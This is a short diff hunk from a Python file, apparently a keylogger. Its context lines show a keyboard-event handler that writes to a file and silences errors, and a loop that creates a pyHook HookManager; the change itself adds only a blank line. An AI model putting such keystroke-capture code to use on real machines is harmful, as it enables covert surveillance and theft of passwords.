@@ -20,6 +20,7 @@ def OnKeyboardEvent(event):
 		f.close()
 	except:
 		pass
+
 def logger():
 	while True:
 			hm = pyHook.HookManager()
